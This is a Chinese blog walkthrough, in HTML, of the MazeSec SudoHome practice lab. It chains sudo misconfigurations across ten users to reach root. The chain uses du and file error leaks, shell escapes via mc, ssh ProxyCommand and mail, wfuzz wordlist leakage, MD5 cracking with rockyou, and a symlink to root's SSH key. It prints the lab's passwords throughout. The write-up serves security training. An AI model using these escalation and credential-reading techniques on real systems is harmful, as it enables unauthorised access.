@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec SudoHome</title>
+        <meta name="description" content="靶机说明 关键词：sudo 链式提权、--files0-from 信息泄露、ProxyCommand 逃逸、wfuzz Payload 回显、md5sum 字典爆破、软链接劫持 摘要：本文记录了 MazeSec SudoHome 靶机的渗透过程。选手通过 SSH 登录提示发现 user1 用户，利用其 sudo 权限逐…">
+    <link rel="canonical" href="https://the0n3.top/pages/maze-sudohome/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec SudoHome">
+    <meta property="og:description" content="靶机说明 关键词：sudo 链式提权、--files0-from 信息泄露、ProxyCommand 逃逸、wfuzz Payload 回显、md5sum 字典爆破、软链接劫持 摘要：本文记录了 MazeSec SudoHome 靶机的渗透过程。选手通过 SSH 登录提示发现 user1 用户，利用其 sudo 权限逐…">
+    <meta property="og:url" content="https://the0n3.top/pages/maze-sudohome/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-sudohome/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec SudoHome">
+    <meta name="twitter:description" content="靶机说明 关键词：sudo 链式提权、--files0-from 信息泄露、ProxyCommand 逃逸、wfuzz Payload 回显、md5sum 字典爆破、软链接劫持 摘要：本文记录了 MazeSec SudoHome 靶机的渗透过程。选手通过 SSH 登录提示发现 user1 用户，利用其 sudo 权限逐…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-sudohome/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec SudoHome</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-25 15:46</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机说明</h2>
+<p><strong>关键词</strong>：sudo 链式提权、--files0-from 信息泄露、ProxyCommand 逃逸、wfuzz Payload 回显、md5sum 字典爆破、软链接劫持</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec SudoHome 靶机的渗透过程。选手通过 SSH 登录提示发现 user1 用户，利用其 sudo 权限逐层向下跳转：user1 通过 sudo du --files0-from 参数泄露 user2 密码；user2 利用 sudo file -f 报错回显获取 user3 凭证；user3 借助 sudo mc -U 直接进入 user4 的 subshell；user4 通过 sudo ssh ProxyCommand 逃逸获得 user5 权限；user5 使用 sudo rev 双重反转读取 user6 密码；user6 利用 sudo cp 覆盖 .profile 窃取 user7 凭证；user7 通过 sudo mail 交互式 shell 切换至 user8；user8 借助 sudo wfuzz 将密码文件作为字典，在 Payload 列中泄露 user9 密码；user9 利用 sudo md5sum 配合 rockyou.txt 字典爆破出 user10 的明文密码 morrinsville；最终 user10 利用 sudo cat 配合家目录写权限，删除并重建指向 /root/.ssh/id_rsa 的软链接，读取 root 私钥完成权限提升。该靶机重点考察了 sudo 配置中各类二进制工具的非常规利用手法以及链式权限提升的完整逻辑。</p>
+<h2>ARP 扫描存活主机</h2>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ sudo arp-scan -I eth1 192.168.56.0/24
+
+192.168.56.142  08:00:27:94:61:b4       (Unknown)</code></pre>
+<p>目标主机 IP：192.168.56.142</p>
+<h2>TCP 全端口扫描</h2>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ nmap -p- -sT  192.168.56.142
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+25/tcp open  smtp
+80/tcp open  http</code></pre>
+<p>开放了 22、25、80 端口</p>
+<h2>80 端口服务探测</h2>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ curl http://192.168.56.142
+&lt;!-- try ssh --&gt;</code></pre>
+<p>常规扫描没有发现有用信息，看到提示 try ssh，尝试 ssh 登录</p>
+<h2>user1</h2>
+<p>提示使用ssh，尝试 ssh 登录root，ssh banner信息里留了一个user1</p>
+<p><img src="/images/maze-sudohome/1.png" alt="" decoding="async" width="963" height="404"></p>
+<p><img src="/images/maze-sudohome/2.png" alt="" decoding="async" loading="lazy" width="955" height="471"></p>
+<blockquote>
+<p>user1 : 0woA8Sr7I83R0ZwmnTcH</p>
+</blockquote>
+<p>家目录有10个用户，每个用户目录下有一个password.txt文件</p>
+<p><img src="/images/maze-sudohome/3.png" alt="" decoding="async" loading="lazy" width="754" height="437"></p>
+<h2>user2 du 读取文件</h2>
+<p>user1用户可以无密码使用 user2 的 du 命令，--help看看帮助</p>
+<p><img src="/images/maze-sudohome/4.png" alt="" decoding="async" loading="lazy" width="1123" height="731"></p>
+<p>其中的<code>--files0-from=F</code>参数是为了解决文件名中包含空格的问题，文件名以ASCII NUL字符（即\0）分隔的问题，可以从文件F中读取文件名列表</p>
+<p>当 password.txt 中的内容被当作“文件名”，而这些文件名又实际不存在时，du 在报错时会把这些“文件名”完整打印出来，等于把 password.txt 暴露了。</p>
+<pre><code class="language-bash">user1@SudoHome:~$ sudo -u user2 /usr/bin/du --files0-from=/home/user2/password.txt
+/usr/bin/du: cannot access 'tLPi3BLMG2zmwvZ5z9rh'$'\n': No such file or directory</code></pre>
+<blockquote>
+<p>user2 : tLPi3BLMG2zmwvZ5z9rh</p>
+</blockquote>
+<h2>user3 file 读取文件</h2>
+<p>user2用户可以无密码使用 user3 的 file 命令，-f参数是从文件中读取文件名列表</p>
+<p><img src="/images/maze-sudohome/5.png" alt="" decoding="async" loading="lazy" width="1312" height="235"></p>
+<p>可以在 gtfobins 上找到利用方法 <a href="https://gtfobins.github.io/gtfobins/file/">https://gtfobins.github.io/gtfobins/file/</a></p>
+<p><img src="/images/maze-sudohome/6.png" alt="" decoding="async" loading="lazy" width="1275" height="569"></p>
+<p>使用 file -f /home/user3/password.txt 时，file 会把文件中的每一行当作文件名；不存在的文件在报错信息中被原样打印出来，从而泄露密码内容。</p>
+<pre><code class="language-bash">user2@SudoHome:~$ sudo -u user3 /usr/bin/file -f /home/user3/password.txt 
+TFqxDyfGO69DP1lyjt0f: cannot open `TFqxDyfGO69DP1lyjt0f' (No such file or directory)</code></pre>
+<blockquote>
+<p>user3 : TFqxDyfGO69DP1lyjt0f</p>
+</blockquote>
+<h2>user4 mc getshell</h2>
+<p>user3用户可以无密码使用 user4 的 mc 命令</p>
+<p><img src="/images/maze-sudohome/7.png" alt="" decoding="async" loading="lazy" width="995" height="214"></p>
+<p>mc 命令可以进入子shell或编辑文件</p>
+<p><img src="/images/maze-sudohome/8.png" alt="" decoding="async" loading="lazy" width="1116" height="750"></p>
+<p>-U 直接启动 subshell，这里通过 sudo 以 user4 身份启动 subshell，从而获得 user4 的交互 shell。</p>
+<pre><code class="language-bash">user3@SudoHome:~$ sudo -u user4 /usr/bin/mc -U</code></pre>
+<p><img src="/images/maze-sudohome/9.png" alt="" decoding="async" loading="lazy" width="909" height="378"></p>
+<p><img src="/images/maze-sudohome/10.png" alt="" decoding="async" loading="lazy" width="752" height="219"></p>
+<pre><code class="language-bash">user4@SudoHome:/home/user3$ whoami
+user4
+
+user4@SudoHome:/home/user3$ cat /home/user4/password.txt
+B0aWh2XHpp5hOIVtCUbn</code></pre>
+<blockquote>
+<p>user4 : B0aWh2XHpp5hOIVtCUbn</p>
+</blockquote>
+<h2>user5 ssh getshell</h2>
+<p>user4用户可以无密码使用 user5 的 ssh 命令</p>
+<p><img src="/images/maze-sudohome/11.png" alt="" decoding="async" loading="lazy" width="877" height="194"></p>
+<p>gtfobins 上有利用方法 <a href="https://gtfobins.github.io/gtfobins/ssh/">https://gtfobins.github.io/gtfobins/ssh/</a></p>
+<p><img src="/images/maze-sudohome/12.png" alt="" decoding="async" loading="lazy" width="1236" height="807"></p>
+<p>ssh 进入 user5 的shell</p>
+<pre><code class="language-bash">user4@SudoHome:~$ sudo -u user5 /usr/bin/ssh -o ProxyCommand=';bash 0&lt;&amp;2 1&gt;&amp;2' x
+user5@SudoHome:/home/user4$ id
+uid=1004(user5) gid=1004(user5) groups=1004(user5)
+user5@SudoHome:/home/user4$</code></pre>
+<p><img src="/images/maze-sudohome/13.png" alt="" decoding="async" loading="lazy" width="1069" height="145"></p>
+<pre><code class="language-bash">user5@SudoHome:~$ cat password.txt 
+GZ5KErjFycaYHZGj7GcI</code></pre>
+<blockquote>
+<p>user5 : GZ5KErjFycaYHZGj7GcI</p>
+</blockquote>
+<h2>user6 rev 读取文件</h2>
+<p>user5用户可以无密码使用 user6 的 rev 命令</p>
+<p>rev命令可以直接逆序打印文件内容，逆序两次就正回来了</p>
+<pre><code class="language-bash">user5@SudoHome:~$ sudo -u user6 /usr/bin/rev /home/user6/password.txt|rev
+LowGbJGVAxhQw63UWc5Z</code></pre>
+<blockquote>
+<p>user6 : LowGbJGVAxhQw63UWc5Z</p>
+</blockquote>
+<h2>user7 cp 读取文件</h2>
+<p>user6用户可以无密码使用 user7 的 cp 命令</p>
+<p><img src="/images/maze-sudohome/14.png" alt="" decoding="async" loading="lazy" width="766" height="198"></p>
+<p>user7 的 .profile 是可读的状态，把password.txt 复制过去就可以读取了</p>
+<pre><code class="language-bash">user6@SudoHome:~$ sudo -u user7 /usr/bin/cp /home/user7/password.txt /home/user7/.profile
+user6@SudoHome:~$ cat /home/user7/.profile
+HLoKAOu86miWIYKdyVx3</code></pre>
+<blockquote>
+<p>user7 : HLoKAOu86miWIYKdyVx3</p>
+</blockquote>
+<p>还可以通过 <code>/dev/tty</code>，<code>/dev/tty</code> 是当前终端设备文件，会直接输出到当前终端</p>
+<p><img src="/images/maze-sudohome/29.png" alt="" decoding="async" loading="lazy" width="845" height="195"></p>
+<h2>user8 mail getshell</h2>
+<p>user7用户可以无密码使用 user8 的 mail 命令</p>
+<p><img src="/images/maze-sudohome/15.png" alt="" decoding="async" loading="lazy" width="988" height="231"></p>
+<p>gtfobins 里可以找到相关利用姿势，可以通过 mail 命令的交互式shell执行命令，<a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
+<p><img src="/images/maze-sudohome/16.png" alt="" decoding="async" loading="lazy" width="1236" height="747"></p>
+<p><img src="/images/maze-sudohome/17.png" alt="" decoding="async" loading="lazy" width="751" height="234"></p>
+<pre><code class="language-bash">user7@SudoHome:~$ touch /tmp/111
+user7@SudoHome:~$ sudo -u user8 /usr/bin/mail -f /tmp/111
+Mail version 8.1.2 01/15/2001.  Type ? for help.
+"/tmp/111": 0 messages [Read only]
+&amp; !/bin/bash
+user8@SudoHome:/home/user7$ id
+uid=1007(user8) gid=1007(user8) groups=1007(user8)
+user8@SudoHome:/home/user7$ cd
+user8@SudoHome:~$ cat password.txt 
+UxeGoUq8xqBRxyWVQPYK</code></pre>
+<blockquote>
+<p>user8 : UxeGoUq8xqBRxyWVQPYK</p>
+</blockquote>
+<h2>user9 wfuzz 读取文件</h2>
+<p>user8用户可以无密码使用 user9 的 wfuzz 命令</p>
+<p><img src="/images/maze-sudohome/18.png" alt="" decoding="async" loading="lazy" width="965" height="213"></p>
+<p>将 /home/user9/password.txt 作为 wfuzz 的字典文件，文件中的一行内容会作为 FUZZ 的 payload， wfuzz 会在输出表格的 Payload 列里原样打印这一行，从而泄露密码。</p>
+<p><img src="/images/maze-sudohome/19.png" alt="" decoding="async" loading="lazy" width="1368" height="642"></p>
+<pre><code class="language-bash">user8@SudoHome:~$ sudo -u user9 /usr/bin/wfuzz -w /home/user9/password.txt http://127.0.0.1/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://127.0.0.1/FUZZ
+Total requests: 1
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   404        9 L      31 W       271 Ch      "peqkSBCDKvVxxNwcq1j4"
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0</code></pre>
+<blockquote>
+<p>user9 : peqkSBCDKvVxxNwcq1j4</p>
+</blockquote>
+<h2>user10 md5sum 爆破密码</h2>
+<p>user9用户可以无密码使用 user10 的 md5sum 命令</p>
+<p><img src="img/20.png" alt="" decoding="async" loading="lazy"></p>
+<p>md5sum 可以计算字符串/文件的md5值</p>
+<p>哈希算法不可逆，只能大量爆破，找出相同md5值的字符串</p>
+<p>可以看看 user10 家目录的 password.txt 的文件大小是 13 字节</p>
+<p><img src="img/21.png" alt="" decoding="async" loading="lazy"></p>
+<p>可以通过测试发现一个小细节</p>
+<pre><code class="language-bash">echo 1 &gt; 1.txt
+echo 11 &gt; 2.txt
+echo 111 &gt; 3.txt
+ls -lah</code></pre>
+<p><img src="img/22.png" alt="" decoding="async" loading="lazy"></p>
+<p>可以看到 echo 出来的内容会多一个换行符，占用多一个字节</p>
+<p><img src="img/23.png" alt="" decoding="async" loading="lazy"></p>
+<p>如果 echo 重定向时 使用 -n 参数 就不会多出换行符，在 user9 目录里用几个测试文件演示</p>
+<pre><code class="language-bash">user9@SudoHome:~$ echo -n '1' &gt; 1.txt
+user9@SudoHome:~$ echo -n '11' &gt; 2.txt
+user9@SudoHome:~$ echo -n '111' &gt; 3.txt
+user9@SudoHome:~$ ls -alh
+total 48K
+drwxr-xr-x  4 user9 user9 4.0K Nov 19 10:22 .
+drwxr-xr-x 12 root  root  4.0K Nov 16 08:35 ..
+-rw-r--r--  1 user9 user9    1 Nov 19 10:26 1.txt        
+-rw-r--r--  1 user9 user9    2 Nov 19 10:26 2.txt        
+-rw-r--r--  1 user9 user9    3 Nov 19 10:27 3.txt        
+-rw-------  1 user9 user9 2.3K Nov 17 03:21 .bash_history
+-rw-r--r--  1 user9 user9  220 Apr 18  2019 .bash_logout 
+-rw-r--r--  1 user9 user9 3.5K Apr 18  2019 .bashrc      
+drwxr-xr-x  3 user9 user9 4.0K Nov 16 13:01 .config      
+-rw-------  1 user9 user9   21 Nov 16 08:35 password.txt 
+-rw-r--r--  1 user9 user9  807 Apr 18  2019 .profile     
+drwx------  2 user9 user9 4.0K Nov 16 13:25 .ssh
+user9@SudoHome:~$</code></pre>
+<p><img src="img/24.png" alt="" decoding="async" loading="lazy"></p>
+<p>那么 user10 的 password.txt 是 13 字节，那么内容应该是 12 个字符 + 1 个换行符，或者者 13 个字符没有换行符，大概率是 12 个字符 + 1 个换行符（猜测）</p>
+<p>常见字典中的密码行末一般带一个换行符，因此“文件中一行密码 + 换行”就是 N 字符 + \n；尝试从 rockyou.txt 里筛选出 12 个字符的密码进行爆破</p>
+<pre><code class="language-bash">cat rockyou.txt|awk 'length($0)==12' &gt; pass.txt</code></pre>
+<p>bash脚本爆破</p>
+<pre><code class="language-bash">while read p; do 
+  # echo 默认会自动加换行符，正好符合 13 字节的要求
+  echo "$p" | md5sum | grep "65e31d336be184593812c18533fa4fa2" &amp;&amp; echo "密码是: $p" &amp;&amp; break
+done &lt; pass.txt</code></pre>
+<p><img src="/images/maze-sudohome/25.png" alt="" decoding="async" loading="lazy" width="1147" height="241"></p>
+<blockquote>
+<p>user10 : morrinsville</p>
+</blockquote>
+<p>或者选择php、python语言遍历rockyou.txt，其他语言也可以</p>
+<pre><code class="language-php">&lt;?php
+$targetHash = '65e31d336be184593812c18533fa4fa2';
+$start_time = microtime(true);
+$file = '/usr/share/wordlists/rockyou.txt';
+$handle = fopen($file, "r");
+if ($handle) {
+    while (($line = fgets($handle)) !== false) {
+        if (md5($line) === $targetHash) {
+            $end_time = microtime(true);
+            $elapsed_time = $end_time - $start_time;
+            echo "Found: " . $line;
+            echo "Time elapsed: " . round($elapsed_time, 4) . " seconds\n";
+            fclose($handle);
+            exit;
+        }
+    }
+    fclose($handle);
+    $end_time = microtime(true);
+    $elapsed_time = $end_time - $start_time;
+    echo "Not found.\n";
+    echo "Search completed in: " . round($elapsed_time, 4) . " seconds\n";
+}
+?&gt;</code></pre>
+<p><img src="/images/maze-sudohome/28.png" alt="" decoding="async" loading="lazy" width="589" height="158"></p>
+<h2>root 王炸</h2>
+<p>user10用户可以无密码使用 root 的 cat 命令</p>
+<p>有个小细节，当前在 /home/user10 目录下，是自己的家目录，只要对某个目录有写权限，就可以在该目录中创建、删除、重命名，即使是 root 用户的文件</p>
+<p>sudo 可以使用 cat 读取指定文件 .important，我们有权限删掉 .important 文件，重新做软链接到root用户文件，读取 root 用户敏感文件</p>
+<p><img src="/images/maze-sudohome/26.png" alt="" decoding="async" loading="lazy" width="1047" height="488"></p>
+<p><img src="/images/maze-sudohome/27.png" alt="" decoding="async" loading="lazy" width="901" height="140"></p>
+<p>user1:0woA8Sr7I83R0ZwmnTcH<br>
+user2:tLPi3BLMG2zmwvZ5z9rh<br>
+user3:TFqxDyfGO69DP1lyjt0f<br>
+user4:B0aWh2XHpp5hOIVtCUbn<br>
+user5:GZ5KErjFycaYHZGj7GcI<br>
+user6:LowGbJGVAxhQw63UWc5Z<br>
+user7:HLoKAOu86miWIYKdyVx3<br>
+user8:UxeGoUq8xqBRxyWVQPYK<br>
+user9:peqkSBCDKvVxxNwcq1j4<br>
+user10:morrinsville  </p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#sudo</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
